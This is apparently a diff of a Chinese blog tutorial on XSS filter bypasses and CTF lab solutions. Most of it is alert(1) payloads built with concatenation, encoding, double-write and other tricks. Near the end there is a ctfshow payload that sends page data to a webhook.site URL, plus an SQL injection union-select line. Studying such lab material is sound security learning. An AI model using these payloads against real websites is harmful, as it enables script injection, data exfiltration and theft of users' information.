 <p>在这里，<code>window[&#39;alert&#39;](1)</code> 实际上等同于 <code>window.alert(1)</code>。这行代码的作用是在浏览器中弹出一个警告框，显示数字 1。然而，需要注意的是，这样的代码常常被用于恶意目的，尤其是在尝试进行跨站脚本（XSS）攻击时，因此在实际开发中应该小心处理用户输入，以防止安全漏洞。</p>
 </blockquote>
 <p>其它与之类似的还有top，frame，window，self，parent等等。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</code></pre>
 
 <h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><p>当一些函数被禁用时，可以替换为其他函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</code></pre>
 
-<h5 id="嵌套绕过-双写绕过"><a href="#嵌套绕过-双写绕过" class="headerlink" title="嵌套绕过(双写绕过)"></a>嵌套绕过(双写绕过)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="嵌套绕过-双写绕过"><a href="#嵌套绕过-双写绕过" class="headerlink" title="嵌套绕过(双写绕过)"></a>嵌套绕过(双写绕过)</h5><pre><code class="highlight plaintext">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre>
 
 <p>没啥说的</p>
 <h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><p>这个有点意思，用变量代替字符串，看例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;img src onerror=_=alert,_(1)&gt;
+&lt;img src x=al y=ert onerror=top[x+y](1)&gt;
+&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。
+&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;
+&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</code></pre>
 
 <h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML实体编码和Unicode编码"><a href="#HTML实体编码和Unicode编码" class="headerlink" title="HTML实体编码和Unicode编码"></a>HTML实体编码和Unicode编码</h5><p>原理：</p>
 <p>1.JavaScript引擎会将DOM文档的实体编码解码为原始字符，所以有些字符可以用实体编码代替</p>
 <p>2.在正常情况下，JavaScript 引擎会正确解释和执行 Unicode 编码的字符。例如，下面的 JavaScript 代码将正确输出 “你好”：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line">console.log(&#x27;\u4F60\u597D&#x27;)</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">javascriptCopy code
+console.log(&#x27;\u4F60\u597D&#x27;)</code></pre>
 
 <h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>示例：<code>&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;</code></p>
 <p>原理：在 JavaScript 伪协议中，当使用 <code>javascript:</code> 开头的 URL，并且其中包含编码后的 JavaScript 代码时，浏览器在执行这个 URL 时，会先解码其中的百分号编码，然后再执行解码后的 JavaScript 代码。</p>
@@ -270,7 +347,7 @@
 <p><code>href</code>属性用于指定图像地图中区域的URL。</p>
 <h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><blockquote>
 <p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</code></pre>
 
 <p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20， &#x2F;**&#x2F;</p>
 <p>B位置：%09，%0A，%0C，%0D，%20</p>
@@ -278,38 +355,42 @@
 <p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
 </blockquote>
 <h4 id="小括号-绕过"><a href="#小括号-绕过" class="headerlink" title="小括号()绕过"></a>小括号()绕过</h4><h5 id="利用反引号"><a href="#利用反引号" class="headerlink" title="利用反引号&#96;&#96;"></a>利用反引号&#96;&#96;</h5><p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
 
-<h5 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h5><pre><code class="highlight plaintext">&lt;script&gt;alert;throw 1&lt;/script&gt;</code></pre>
 
-<h4 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h4><h5 id="斜杠替换"><a href="#斜杠替换" class="headerlink" title="斜杠替换"></a>斜杠替换</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h4><h5 id="斜杠替换"><a href="#斜杠替换" class="headerlink" title="斜杠替换"></a>斜杠替换</h5><pre><code class="highlight plaintext">&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;</code></pre>
 
-<h5 id="反引号替换"><a href="#反引号替换" class="headerlink" title="反引号替换"></a>反引号替换</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="反引号替换"><a href="#反引号替换" class="headerlink" title="反引号替换"></a>反引号替换</h5><pre><code class="highlight plaintext">&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;</code></pre>
 
 <h4 id="alert过滤"><a href="#alert过滤" class="headerlink" title="alert过滤"></a>alert过滤</h4><p>用其他函数替换</p>
 <blockquote>
 <p>prompt()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre>
 
 <p>confirm()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre>
 
 <p>console.log()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre>
 
 <p>document.write()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre>
 </blockquote>
 <p>还可以利用编码绕过，JavaScript引擎会自动解码。</p>
 <h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</code></pre>
 
 <h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><blockquote>
 <p>可以利用拆分法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;
+&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;
+&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;
+&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;
+&lt;script&gt;eval(a)&lt;/script&gt;</code></pre>
 
 <p>利用eval()函数将字符串解析为可执行的代码，从而进行拼接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)闯关</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)闯关</code></pre>
 </blockquote>
 <h2 id="XSS-LAB闯关"><a href="#XSS-LAB闯关" class="headerlink" title="XSS_LAB闯关"></a>XSS_LAB闯关</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>source：<code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code></p>
 <p>语句：</p>
@@ -495,245 +576,55 @@
 <h3 id="329"><a href="#329" class="headerlink" title="329"></a>329</h3><p>payload：</p>
 <p>&lt;body&#x2F;**&#x2F;onload&#x3D;window.open(‘<a target="_blank" rel="noopener" href="https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?a=%27+document.getElementsByClassName">https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?a=&#39;+document.getElementsByClassName</a>(‘layui-table-cell laytable-cell-1-0-1’))&gt;</body></p>
 <h3 id="330"><a href="#330" class="headerlink" title="330"></a>330</h3><p>‘ union select ‘a’,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,’g’),1,’h’),2,’i’),3,’j’),4,’k’),5,’l’),6,’m’),7,’n’),8,’o’),9,’p’) from ctfshow_user4</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pax</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/03/18/XSS/">http://example.com/2024/03/18/XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">秋红庭</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%A5%E9%97%A8/">入门</a></div><div class="post_share"><div class="social-share" data-image="/./photo/77.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/18/PHP-message-board/" title="PHP message board"><img class="cover" src="/./photo/9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP message board</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/18/PHP/" title="PHP"><img class="cover" src="/./photo/8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/18/MYSQL%E5%9F%BA%E7%A1%80/" title="MYSQL基础"><img class="cover" src="/./photo/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">MYSQL基础</div></div></a></div><div><a href="/2024/03/18/HTML/" title="HTML"><img class="cover" src="/./photo/2.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">HTML</div></div></a></div><div><a href="/2024/03/18/JavaScipt/" title="JavaScipt"><img class="cover" src="/./photo/5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">JavaScipt</div></div></a></div><div><a href="/2024/05/18/Gopher%E5%85%A5%E9%97%A8/" title="Gopher入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-18</div><div class="title">Gopher入门</div></div></a></div><div><a href="/2024/03/18/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP 反序列化"><img class="cover" src="/./photo/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PHP 反序列化</div></div></a></div><div><a href="/2024/03/18/PHP/" title="PHP"><img class="cover" src="/./photo/8.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PHP</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pax</div><div class="author-info__description">雨打枇杷旧，往事老金锁。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.1.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8BXSS"><span class="toc-number">1.1.1.3.1.</span> <span class="toc-text">储存型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.1.1.3.2.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.1.1.3.3.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JSONP-XSS"><span class="toc-number">1.1.1.3.4.</span> <span class="toc-text">JSONP XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E7%82%B9-%E6%8F%92%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS攻击点(插入点)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%B3%A8%E9%87%8A%E5%86%85%E5%AE%B9%E4%B8%AD"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">插入到HTML注释内容中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E4%B8%AD"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">插入到HTML标签属性值中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%90%8D%E4%B8%AD"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">插入到HTML标签属性名中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0HTML%E6%A0%87%E7%AD%BE%E5%90%8D%E4%B8%AD"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">插入到HTML标签名中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0CSS%E4%B8%AD"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">插入到CSS中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0HTTP%E5%93%8D%E5%BA%94%E4%B8%AD"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">插入到HTTP响应中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.</span> <span class="toc-text">XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">关键词绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">拼接绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.1.2.1.</span> <span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#window"><span class="toc-number">1.1.3.1.2.2.</span> <span class="toc-text">window</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.1.3.1.3.</span> <span class="toc-text">函数替换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.1.4.</span> <span class="toc-text">嵌套绕过(双写绕过)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B5%8B%E5%80%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.1.5.</span> <span class="toc-text">赋值绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E5%92%8CUnicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text">HTML实体编码和Unicode编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text">url编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%EF%BC%9Asrc%E5%92%8Chref%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">1.1.3.2.2.1.</span> <span class="toc-text">附：src和href的运用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 